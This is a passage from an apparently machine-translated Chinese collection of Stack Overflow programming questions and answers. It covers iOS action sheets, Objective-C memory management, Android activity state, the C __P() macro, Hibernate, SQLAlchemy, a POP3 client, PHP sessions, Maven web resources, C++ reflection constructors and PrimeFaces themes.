这可能吗？我想如果我看一下：[示例](http://s3.amazonaws.com/files.posterous.com/app-incubator/mplGAlcfmHlCwDnjcpqtrfyIqsjvafGjvdnJcBvrGnzJgkkElpFHoooroojE/media_httpdldropboxco_mAbpk.png.scaled500.png?AWSAccessKeyId=AKIAJFZAE65UYRT34AOQ&Expires=1366476962&Signature=Ub/dgv/2gghKSP%2b8SA1gpJcYN1s=)

问候

杰文

**已编辑（我的解决方案基于编码的爸爸解决方案）**

```
UIActionSheet *actionSheet = [[UIActionSheet alloc] initWithTitle:nil
                                                             delegate:nil
                                                    cancelButtonTitle:nil
                                               destructiveButtonTitle:nil
                                                    otherButtonTitles:nil];
    [actionSheet setActionSheetStyle:UIActionSheetStyleBlackTranslucent];

    CGRect pickerFrame = CGRectMake(0, 0, 0, 0);
    UIPickerView *pickerView = [[UIPickerView alloc]initWithFrame:pickerFrame];
    pickerView.showsSelectionIndicator = YES;
    pickerView.dataSource = self;
    pickerView.delegate = self;

    UISegmentedControl *backButton =  [[UISegmentedControl alloc] initWithItems:[NSArray arrayWithObjects:@"Back", nil]] ;
    [backButton addTarget:self action:@selector(someFunction:) forControlEvents:UIControlEventValueChanged];
    backButton.tintColor = [UIColor colorWithRed:0.10 green:0.20 blue:0.52 alpha:0.5];
    backButton.segmentedControlStyle = UISegmentedControlStyleBar;
    [backButton addTarget:self action:@selector(btnActionCancelClicked:) forControlEvents:UIControlEventAllEvents];
    backButton.frame = CGRectMake(20.0, 220.0, 280.0, 40.0);

    UISegmentedControl *acceptButton =  [[UISegmentedControl alloc] initWithItems:[NSArray arrayWithObjects:@"Accept", nil]] ;
    [acceptButton addTarget:self action:@selector(anotherFunction:) forControlEvents:UIControlEventValueChanged];
    acceptButton.tintColor = [UIColor colorWithRed:0.10 green:0.20 blue:0.52 alpha:0.5];
    acceptButton.segmentedControlStyle = UISegmentedControlStyleBar;
    acceptButton.frame = CGRectMake(20.0, 280.0, 280.0, 40.0);

    [actionSheet addSubview:pickerView];
    [actionSheet addSubview:backButton];
    [actionSheet addSubview:acceptButton];

    [actionSheet showInView:[[UIApplication sharedApplication] keyWindow]];
    [actionSheet setFrame:CGRectMake(0,150,320, 400)]; 
```

...然后只需应用 iPhone 5/iphone 4 相关视图大小约束

**编辑2：** 只是另一个提示！最初我想使用标准的 Actionsheet，但不想将pickerview 放在底部。我没有找到如何移动按钮的方法。显然这很简单：[在 UIActionSheet 上添加 UIView 作为 subView](https://stackoverflow.com/questions/11051512/add-uiview-as-subview-on-uiactionsheet)很高兴知道；）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-22T06:02:15.620

您有 2 种可能性：

**选项1：大调整。**

ActionSheet 以在初始化期间定义的顺序显示按钮。所以在顶部放置一些虚拟按钮，取消将是唯一可见的，所有其他按钮将被选择器视图隐藏。代码*（otherButtonTitles 的警告调整）*：

```
UIActionSheet *menu = [[UIActionSheet alloc] initWithTitle:@"Actionsheet"
                                                  delegate:self
                                         cancelButtonTitle:@"Cancel"
                                    destructiveButtonTitle:nil
                                         otherButtonTitles:@"1", @"2", @"3", @"4", nil];

UIPickerView *pickerView = [[UIPickerView alloc] init];
pickerView.delegate = self;
pickerView.dataSource = self;

[menu addSubview:pickerView];
[menu showInView:self.view];
[menu setBounds:CGRectMake(0,0,320, 500)];

CGRect pickerRect = pickerView.bounds;
pickerRect.origin.y = 35;
pickerView.frame = pickerRect; 
```

**选项2：自制**

```
menu = [[UIActionSheet alloc] initWithTitle:@"Actionsheet"
                                                  delegate:self
                                         cancelButtonTitle:nil
                                    destructiveButtonTitle:nil
                                         otherButtonTitles:nil];

UIPickerView *pickerView = [[UIPickerView alloc] init];
pickerView.delegate = self;
pickerView.dataSource = self;
CGRect pickerRect = pickerView.bounds;
pickerRect.origin.y = 35;
pickerView.frame = pickerRect;

UIButton *startbtn = [UIButton buttonWithType:UIButtonTypeCustom];
startbtn.frame = CGRectMake(80,230, 170, 73);
[startbtn setBackgroundImage:[UIImage imageNamed:@"yourbutton.png"] forState:UIControlStateNormal];
[startbtn addTarget:self action:@selector(pressedbuttonCancel:) forControlEvents:UIControlEventTouchUpInside];

[menu addSubview:pickerView];
[menu addSubview:startbtn];
[menu showInView:self.view];
[menu setFrame:CGRectMake(0,150,320, 350)]; 
```

检查选项 2 的按钮是否应该在操作表上，除非点击不会被发送到选择器方法。

# ios - 设置按钮的 tltleColor

> ID：16122488
> 
> 赞同：0
> 
> 时间：2013-04-20T16:17:40.733
> 
> 标签：ios, objective-c, uibutton, uicolor, textcolor

当我尝试更改按钮内文本的颜色时，我的应用程序崩溃了`myButton.titleLabel.textColor`。

如果我这样做，应用程序不会崩溃，但文本的颜色会保持`blackColor`：

```
[myButton setTitleColor:[UIColor colorWithRed:0.41 green:0.107 blue:0.252 alpha:1.0] forState:UIControlStateNormal]; 
```

如果我以其他方式执行此操作，应用程序将崩溃：

米：

```
-(IBAction)buttonTapped:(id)sender {

    [myButton setTitleColor:myColor forState:UIControlStateNormal];

}

[...]

-(void) viewDidLoad {

    myColor = [UIColor colorWithRed:0.41 green:0.107 blue:0.252 alpha:1.0];

} 
```

。H：

```
UIColor *myColor; 
```

调试器输出：

```
2013-04-20 18:23:45.625 myApp[6291:c07] -[NSShadow set]: unrecognized selector sent to instance 0x753bfd0
2013-04-20 18:23:45.627 myApp[6291:c07] *** Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '-[NSShadow set]: unrecognized selector sent to instance 0x753bfd0'
*** First throw call stack:
(0x15bb012 0x12c8e7e 0x16464bd 0x15aabbc 0x15aa94e 0x369c87 0x369f76 0x368cd9 0x36b098 0x25ce6e 0x126a3f 0x12652c 0x1269ba 0x1262b6 0x126994 0x11b0e2 0x11b15c 0x990bc 0x9a227 0x9a8e2 0x1583afe 0x1583a3d 0x15617c2 0x1560f44 0x1560e1b 0x261c7e3 0x261c668 0x20cffc 0x21c2 0x20f5)
libc++abi.dylib: terminate called throwing an exception
(lldb) 
```

我该如何解决？我想使用第二种方式（如果可能的话）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T16:24:09.523

您创建的颜色对象`colorWithRed:green:blue:alpha:`是*autoreleased*，因此在`buttonTapped:`调用时，该对象已经被释放，因此您有一个指向垃圾数据的指针（一个悬空指针）。

您可以切换到使用 ARC（自动引用计数），和/或为`myColor`. 在您的标题中看起来像这样：

```
@property (nonatomic, retain) UIColor *myColor; 
```

然后，不要直接设置实例变量，而是使用：

```
self.myColor = [UIColor colorWithRed:0.41 green:0.107 blue:0.252 alpha:1.0]; 
```

在`viewDidLoad`. 如果您不使用 ARC，请不要忘记释放颜色`dealloc`：

```
- (void)dealloc
{
    [_myColor release];
    [super dealloc];
} 
```

# android - android返回activity后恢复edittext的状态

> ID：16122489
> 
> 赞同：1
> 
> 时间：2013-04-20T16:17:44.913
> 
> 标签：android, android-edittext, state, retain

我是 android 开发的初学者，我正在处理一个可能很容易解决的问题。我有一个主活动，它是一个菜单，用户可以单击菜单上的项目。然后使用 startActivity(new Intent("com.example.test.FIRSTITEM")); 启动一个新的 Activity。此活动开始一个带有少量编辑文本的布局。我在里面写了一些东西。然后要回到 MainActivity（菜单所在的位置），必须按下返回按钮。 **现在我想要的行为是，如果我返回带有编辑文本的 Activity，我希望它们处于相同的状态 - 这意味着内容不会被清除。** 我搜索了很多并尝试了 android:launchMode="" 的所有选项（singleTop、singleInstance、singleTask）。从 MainActivity 开始新意图时，我也尝试使用标志： startActivity(new Intent("com.example.test.FIRSTITEM").setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP)) 我尝试使用 onSavedInstanceState(Bundle bundle）但是当按下后退按钮时永远不会调用这个（可能是因为活动还没有真正完成）

我确信答案很简单，但我似乎找不到。我一定错过了活动如何运作的一些逻辑。提前谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T17:18:07.423

我认为[这](https://stackoverflow.com/questions/4096169/onsaveinstancestate-and-onrestoreinstancestate)可以帮助你。你可以使用 `onsaveinstancestate()`and `onrestoreinstancestate()`。

# c - 函数指针声明 - __P 做什么？

> ID：16122490
> 
> 赞同：8
> 
> 时间：2013-04-20T16:18:01.377
> 
> 标签：c, function, declaration, function-prototypes

函数指针定义的通常形式是：

```
 int function(int, int);
 int (*ptr)(int, int); 
```

但是我今天看到了一个我不明白的表格。任何人都可以解释一下吗？

```
int (*close)    __P((struct __db *)); 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-20T16:28:12.687

该`__P()`宏通常用于支持从 K&R C 时代开始的 C 实现，当时还没有原型（使用 C89 引入 C）。基本上逻辑是

```
#if SOME_LOGIC_TO_TEST_WHETHER_IMPLEMENTATION_SUPPORTS_PROTOTYPES
#  define __P(argument_list) argument_list
#else
#  define __P(argument_list) () 
#endif 
```

当应用于您的示例时，您能看到它是如何工作的吗？请注意，要使其正常工作且不会导致语法错误，参数列表必须包含***函数调用***的括号，而不仅仅是***类函数宏***的括号。因此，使用宏时要加上双括号。这可能就是它看起来不寻常的原因。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-04-20T16:26:05.137

`__P()`只是一个宏。在我的系统上，它的定义如下（in `sys/cdefs.h`）：

```
#if defined(__STDC__) || defined(__cplusplus)
#define __P(protos)     protos          /* full-blown ANSI C */
#else   /* !(__STDC__ || __cplusplus) */
#define __P(protos)     ()              /* traditional C preprocessor */
#endif  /* !__GNUC__ */ 
```

由此看来，它似乎被用来保持与（非常）旧编译器的兼容性。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-20T16:24:00.247

> 函数指针定义的通常形式是....但是我今天看到了一个我不明白的形式。

这里没有什么特别的，没有神奇的语法。这**不是**函数指针声明的不同*形式*。

这只是函数指针声明的标准形式，`__P()`是由您正在使用的头文件之一定义的宏。因此，找到该宏定义以了解其用途。

# hibernate - 我的代码中的休眠资源泄漏

> ID：16122491
> 
> 赞同：0
> 
> 时间：2013-04-20T16:18:04.423
> 
> 标签：hibernate

我的代码中似乎“泄漏”了一些 Hibernate 资源。
**伪代码**
对于 20,000 多条记录中的每
一条 使用 Criteria 和示例实体查找记录 将
新对象添加到实体上的集合中 将
带有新对象的实体保存到数据库

**问题**
示例实体的查找在记录 12,764 处失败。如果我在测试用例中只执行那个 find ，它就会被成功检索。如果我将输入文件分成多个文件，每个文件有 10,000 条记录，则所有记录都会被处理。这是我用来查找数据库记录的代码

```
try {
    // begin transaction
    ses = Activator.getSession();
    ses.beginTransaction();

    // find the object
    Criteria crit = getSession().createCriteria(getPersistentClass());
    Example example = Example.create(exampleInstance);
    for (String exclude : excludeProperty) {
        example.excludeProperty(exclude);
    }
    crit.add(example);
    foundEntities =  crit.list();

    for (T curT : foundEntities) {
        this.initHibernateEntity((I) curT);
    }

    // commit transaction
    ses.getTransaction().commit();
} catch // all exceptions
finally {
    if (ses != null && ses.isOpen()) {
            ses.close();
        }
    } 
```

我将不胜感激有关这可能在哪里的任何建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:41:06.760

我怀疑您遇到了页面限制/并发锁定问题 - 所有这些工作都在一个事务中执行。是否有任何理由不以较小的批次（如您提到的 10,000 个）和汇总结果执行？

[体面的资源](http://martin.podval.eu/2010/12/nhibernate-performance-isssues-insert.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T17:36:37.100

StackOverflow 最好的部分之一是努力将问题缩小到足以发布的程度。我经常在这个过程中找到答案，但从未发布过。

不幸的是，这次我在发布后发现了自己的错误。问题是我的不良遗留数据和不良日志消息的结合。

我希望您没有花太多时间查看代码。

# python - SqlAlchemy：从对象引用绑定会话？

> ID：16122493
> 
> 赞同：1
> 
> 时间：2013-04-20T16:18:07.447
> 
> 标签：python, sqlalchemy

假设我正在使用如下声明性对象：

```
class MyObject(DeclarativeBase):
   ...
   other_object_id = Column(Integer, ForeignKey('other_object.id'))
   other_object = relationship("OtherObject")
   ... 
```

假设我想要一个方便的方法`set_other_object_value`，如果需要，它将修改`other_object.value`、*创建*一个实例`OtherObject`并将其添加到会话中：

```
def set_other_object_value(self, value):
   if self.other_object is None:
      <create instance of OtherObject and associate with the session>
   self.other_object.value = value 
```

问题是：如何创建`OtherObject`并将其与会话关联？一个可能等效的问题：是否可以访问从 的实例中添加的 a`Session`的`MyObject`实例`MyObject`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-20T20:51:05.633

使用[`object_session`](http://docs.sqlalchemy.org/en/rel_0_8/orm/session.html#sqlalchemy.orm.session.object_session)：

```
from sqlalchemy.orm.session import object_session
# ...

def set_other_object_value(self, value):
    if self.other_object is None:
        value = OtherObject(...)
    self.other_object.value = value
    object_session(self).add(value) 
```

但是，如果您正确设置了关系，则无需将新的添加`value`到会话中，因为无论如何`sqlalchemy`都会弄清楚并将其保存到您的数据库中。`commit`

# c - AUTH 状态期间的 POP 客户端问题

> ID：16122500
> 
> 赞同：1
> 
> 时间：2013-04-20T16:18:40.153
> 
> 标签：c, openssl, pop3

您好，我正在 Ubuntu 上用 C 语言编写一个 POP3 客户端。我正在使用 OpenSSL。我被困在授权状态！我发送用户名并获得成功响应，当我发送密码时，它总是说`-ERR bad command`。我确定密码是正确的。由于我使用的是 OpenSSL ，因此 Wireshark 并没有太大帮助。这是我发送密码的方式

```
scanf("%s",password);
sprintf(pass_cmd,"PASS %s\r\n",password);
sent =  SSL_write(ssl, pass_cmd, strlen(pass_cmd)); 
```

`pass_cmd`在写入之前被刷新和清理。这`strlen`也给出了一个有效的大小，包括`\r\n`

任何指针将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T20:27:05.093

阅读 RFC 1939 和 1734，您可以看到 POP 具有多种身份验证机制，并且给定的服务器并不总是接受 PASS（例如，它们可能需要 APOP）。例如，Gmail 似乎就是这种情况。

尝试使用其他 POP 服务器或更改您自己的服务器的设置。

# php - $_SESSION 变量选择性加载

> ID：16122501
> 
> 赞同：2
> 
> 时间：2013-04-20T16:18:40.497
> 
> 标签：php, javascript, session

所以，这是一个令人头疼的问题。我正在通过 ajax 提交登录表单，该表单工作正常。登录时，我设置了几个 $_SESSION 变量并将 3 个 php 文件加载到 div 中，以使用用户的帐户信息刷新数据。这是javascript：

```
function processLogin() {
    $.post("/login/index.php" , $("#djloginform").serialize(), 
        function(data) {
            if (data.error == 0) {
                $("#featuredJobs").load("/jobs/featured.php");
                $("#allJobs").load("/jobs/alljobs.php");
                $("#loginbox").load("/login/loggedin-yes.php");
            }
            else {
                alert(data.error);
                $("#djloginemail").val("").focus();
                $("#djloginpassword").val("");
            }
        }, 'json');
} 
```

features.php 和 alljobs.php 正在正确加载并使用 $_SESSION 变量，因此它们被正确设置并被 3 个 php 文件中的 2 个使用。这是未显示的代码：

```
Logged in as 
<span style="font-weight: bold;">
    <?php echo $_SESSION['djfullname']; ?>
</span> 
```

我只是得到“登录为”，但是当我刷新页面时，我得到“作为 [名称] 登录”。

这三个页面都使用了完全相同的 $_SESSION 变量，所以我不知道这里发生了什么。有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T16:27:01.323

使用 session_start(); 在回显 $_SESSION['djfullname'] 之前。

# c# - 有什么方法可以在 Excel 工作表中提取单元格的编码名称？

> ID：16122504
> 
> 赞同：0
> 
> 时间：2013-04-20T16:19:03.973
> 
> 标签：c#, unicode, encoding, character-encoding, export-to-excel

问题是 Excel 表格中的单元格文本可以使用一些编码表进行编码，最流行的是 Unicode 编码表（用于非英语语言），但确实存在其他编码表。因此，要将 Excel 工作表中的单元格文本转换为 Unicode 文本，我必须知道源编码（除了 Unicode，我的语言还有一些编码表，即 VNI、VPS、VISCII、TCVN3、VIQR），我想知道如何提取该信息从单元格中读取 Excel 文件？

您可以使用任何可能的 Excel 库给我一个解决方案。我正在使用 NPOI，但我仍然不知道该怎么做（我对 NPOI 有点陌生）。

您的帮助将不胜感激。

# image - 下载的图像不在 maven 项目中显示

> ID：16122505
> 
> 赞同：0
> 
> 时间：2013-04-20T16:19:05.413
> 
> 标签：image, maven, dynamic

我有一个 Maven 项目，我在文件夹中下载图像`\src\main\webapp\images\`，但不在浏览器中显示。例子：

```
|- src
    |- main
        |- java
        |- resources
        |- webapps
            |- images
                 |- image1.jpg (fixed)
                 |- image2.jpg (fixed)
                 |- image3.jpg (downloaded with my app) 
```

如果我显示`image1.jpg`或`image2.jpg`工作完美，但如果我尝试显示`image3.jpg`不工作：

```
<img src="images/image1.jpg" /> <!-- Works -->
<img src="images/image2.jpg" /> <!-- Works -->
<img src="images/image3.jpg" /> <!-- Not Works --> 
```

任何想法？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-21T18:04:35.930

好吧...据我了解，您正在运行时修改您的网络应用程序资源。它在 Eclipse 中运行良好，因为当您的工作区被修改时，Eclipse 会进行某种热部署（即，当在您的 webapp 目录中添加新文件时，它会自动作为您的应用服务器的 web 资源使用）。

我不认为这是一个好的设计。想象一下，你下载了一张图片，然后重新部署你的 webapp：下载的图片将会丢失。

不要将下载的图像放在您的网络应用程序资源中：将它们放在其他地方（在战争层次结构之外，可能在您的网络服务器管理的目录中）

# c++ - 通过接口转发构造函数参数

> ID：16122506
> 
> 赞同：0
> 
> 时间：2013-04-20T16:19:08.060
> 
> 标签：c++, reflection, c++11, metaprogramming

我需要一种通用的方法来创建任何类型的实例。此任务需要从非模板对象执行，因此我目前正在使用如下接口：

```
class Interface
{
public:
  virtual void PlacementCopy( void *data, const void *src ) const = 0;
  virtual void PlacementNew( void *data ) const = 0;
  virtual void PlacementDelete( void *data ) const = 0;
  virtual void Delete( void *data) const = 0;
  virtual void Copy( void *dest, const void *src ) const = 0;
  virtual void NewCopy( void **dest, const void *src ) const = 0;
  virtual void *New( ) const = 0;
}; 
```

这都是自定义反射系统的一部分，因此它的使用方式如下：

```
int *p = META( int )->Interface->New( );
*p = 10; 
```

这通过创建一个派生自 的模板化对象来工作`Interface`，该对象包含要构造的类型。Interface 中的`New`运算符默认构造类型：

```
template <typename T>
class Derived : public Interface
{
  virtual void *New( void ) const override
  {
    return new T( );
  }
}; 
```

**问题**：以这种方式构造的所有类型都必须提供默认构造函数。我想以某种方式允许将任意参数传递给相关类型的构造函数。

我不知何故需要能够做到：

```
MetaInfo *meta = META( SomeType );
SomeType *object = meta->New( arg1, arg2 ); 
```

在实现中可能看起来像这样：

```
template <typename T>
Derived : public Interface
{
  template <typename ... Args>
  virtual void *New( Args&& ... args ) const override
  {
    new T( std::forward<Args>( args ) ... );
  }
}; 
```

该`MetaInfo`对象不是模板类型，因此很难提出参数转发解决方案。我不能简单地模板化类中的`New`方法`Derived`，因为您不能模板化虚拟方法。

如果没有一些疯狂的代码预处理，我的要求是否可能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T22:26:36.243

在一些朋友的帮助下，我最终收集了一个解决方案！

所以最大的问题是在反射中注册的所有类型都需要一个默认构造函数。为了解决这个问题，您可以使用 SNIFAE 检查默认构造函数是否存在。

```
struct HasDefaultCtor
{
  template <typename U>
  static int32 SFINAE( decltype( U( ) ) * );
  template <typename U>
  static int8 SFINAE( ... );

  static const bool value = sizeof( SFINAE<T>( NULL ) ) == sizeof( int32 );
}; 
```

除此之外，所有非默认构造函数都必须在反射系统中手动注册，或者使用预构建步骤工具生成。额外的 SNIFAE 检查可用于类型检查并确保注册的构造函数实际上与类中的真实构造函数匹配。对于实际调用`New`运算符，需要进行一些运行时解析，以便确定需要什么构造函数来匹配`New`调用。

我希望这是有道理的，并且最终对将来的某人有用。

我还对复制构造函数进行了 SNIFAE 检查：

```
template <typename T>
struct HasCopyCtor
{
  static T MakeT( void );

  template <typename U>
  static int32 SFINAE( decltype( U( MakeT( ) ) ) * );
  template <typename U>
  static int8 SFINAE( ... );

  static const bool value = sizeof( SFINAE<T>( NULL ) ) == sizeof( int32 );
}; 
```

# spring - PrimeFaces，themeroller，主题更改时出错

> ID：16122507
> 
> 赞同：0
> 
> 时间：2013-04-20T16:19:08.327
> 
> 标签：spring, jsf, primefaces, themeroller

我在 pom.xml 中添加了 all-themes.jar，它适用于 web.xml 中的一个主题。

```
<context-param>
        <param-name>primefaces.THEME</param-name>
        <param-value>excite-bike</param-value>
</context-param> 
```

但是当我在 web.xml 中声明主题为动态使用 EL2.2

```
<context-param>
        <param-name>primefaces.THEME</param-name>
        <param-value>#{userSettingsController.currentTheme.name}</param-value>
</context-param> 
```

当我在下拉列表中更改主题时，主题滚轮出现以下错误。

```
Apr 20, 2013 5:08:24 PM org.apache.catalina.core.StandardWrapperValve invoke
SEVERE: Servlet.service() for servlet [appServlet] in context with path [/timetable] threw exception [Request processing failed; nested exception is org.springframework.webflow.execution.FlowExecutionException: Exception thrown in state 'start' of flow 'teacher'] with root cause
javax.faces.FacesException: Error loading theme, cannot find "theme.css" resource of "primefaces-" library
    at org.primefaces.renderkit.HeadRenderer.encodeTheme(HeadRenderer.java:130)
    at org.primefaces.renderkit.HeadRenderer.encodeBegin(HeadRenderer.java:92)
    at javax.faces.component.UIComponentBase.encodeBegin(UIComponentBase.java:829)
    at javax.faces.component.UIComponent.encodeAll(UIComponent.java:1650)
    at javax.faces.component.UIComponent.encodeAll(UIComponent.java:1655)
    at com.sun.faces.application.view.FaceletViewHandlingStrategy.renderView(FaceletViewHandlingStrategy.java:399)
    at com.sun.faces.application.view.MultiViewHandler.renderView(MultiViewHandler.java:131)
    at org.springframework.faces.webflow.FlowViewHandler.renderView(FlowViewHandler.java:99)
    at com.sun.faces.lifecycle.RenderResponsePhase.execute(RenderResponsePhase.java:121)
    at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:101)
    at com.sun.faces.lifecycle.LifecycleImpl.render(LifecycleImpl.java:139)
    at org.springframework.faces.webflow.FlowLifecycle.render(FlowLifecycle.java:80)
    at org.springframework.faces.webflow.JsfView.render(JsfView.java:90)
    at org.springframework.webflow.engine.ViewState.render(ViewState.java:296)
    at org.springframework.webflow.engine.ViewState.refresh(ViewState.java:243)
    at org.springframework.webflow.engine.ViewState.resume(ViewState.java:221)
    at org.springframework.webflow.engine.Flow.resume(Flow.java:545)
    at org.springframework.webflow.engine.impl.FlowExecutionImpl.resume(FlowExecutionImpl.java:261)
    at org.springframework.webflow.executor.FlowExecutorImpl.resumeExecution(FlowExecutorImpl.java:169)
    at org.springframework.webflow.mvc.servlet.FlowHandlerAdapter.handle(FlowHandlerAdapter.java:183)
    at org.springframework.faces.webflow.JsfFlowHandlerAdapter.handle(JsfFlowHandlerAdapter.java:48)
    at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:900)
    at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:827)
    at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:882)
    at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:778)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:330)
    at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:118)
    at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:84)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:113)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:103)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:113)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:54)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:45)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.authentication.www.BasicAuthenticationFilter.doFilter(BasicAuthenticationFilter.java:150)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:183)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:105)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.session.ConcurrentSessionFilter.doFilter(ConcurrentSessionFilter.java:125)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:87)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
    at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:192)
    at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:160)
    at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:346)
    at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:259)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
    at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88)
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:225)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98)
    at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:927)
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
    at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1001)
    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:585)
    at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:312)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:722) 
```

我尝试了三种方法，一种来自showcase，另一种来自primefaces book，最后一种来自一些教程。我总是得到同样的错误。我什至完全复制了示例中的代码，但仍然没有，我假设我在 web.xml 或 faces-config.xml 中缺少一些设置......有人可以帮助我吗？非常感谢！我使用 Spring 3.1、primefaces 3.5、jsf 2.0.7。

**编辑：** - 当我导航到另一个页面但不更改起始主题时它可以工作 - 我可以更改主题，但是当主题更改并且我导航到另一个页面时出现上述错误 - 默认主题是什么并不重要，它会加载并只要不更改默认主题，我就可以浏览整个应用程序

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-24T12:42:16.357

我遇到了**完全相同**的问题 - themeSwitcher 不在表单元素内，所以只要我不进行导航，它就可以工作。然后它只是因为空字符串被设置为当前主题而分手 - 这就是我收到消息的原因：

**javax.faces.FacesException：加载主题时出错，找不到“primefaces-”库的“theme.css”资源**

而不是这样的：

**javax.faces.FacesException：加载主题时出错，找不到“primefaces-cupertino”库的“theme.css”资源**

所以，如果你有这个问题，首先检查`<p:themeSwitcher>`是否被`<h:form>`元素包围。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-21T01:54:34.240

你试过了吗：

用户界面页面（xhtml，...）：

```
 <p:themeSwitcher style="width: 200px" value="#{topBean.theme}"  id="defaultSwitcher">  
                        <f:selectItem itemLabel="Choose Theme" itemValue="" />  
                        <f:selectItems value="#{topBean.themes}" />
                        <p:ajax listener="#{topBean.saveTheme}" />  
                    </p:themeSwitcher> 
```

豆：

```
private Map<String, String> themes;
    private String theme;
    private GuestPreferences gp;
    public TopBean(){
        theme = "eggplant";
    }

    public Map<String, String> getThemes() {
        return themes;
    }

    public String getTheme() {
        return theme;
    }

    public GuestPreferences getGp() {
        return gp;
    }

    public void setThemes(Map<String, String> themes) {
        this.themes = themes;
    }

    public void setTheme(String theme) {
        this.theme = theme;
    }

    public void setGp(GuestPreferences gp) {
        this.gp = gp;
    }

